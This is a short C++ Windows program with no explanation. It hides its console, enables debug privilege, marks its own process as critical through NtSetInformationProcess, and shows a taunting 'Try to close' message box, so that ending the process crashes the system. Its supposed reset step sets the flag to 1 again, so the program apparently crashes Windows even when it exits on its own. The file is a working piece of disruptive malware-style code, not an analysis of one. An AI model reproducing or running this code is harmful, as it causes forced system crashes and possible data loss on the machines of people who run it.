#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);

int main()
{
   ::ShowWindow(GetConsoleWindow(), SW_HIDE);

  
    BOOLEAN bool_1;
    if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &bool_1)))
        return  1;

    ULONG BreakOnTermination_True = 1;
    NTSTATUS status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination_True, sizeof(ULONG));
    if (status != 0)
        return 1;

    MessageBox(0, L"No way", L"Try to close", 0);

    ULONG BreakOnTermination_False = 1;
    NTSTATUS status2 = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination_False, sizeof(ULONG));
    if (status2 != 0)
        return 1;

    
}


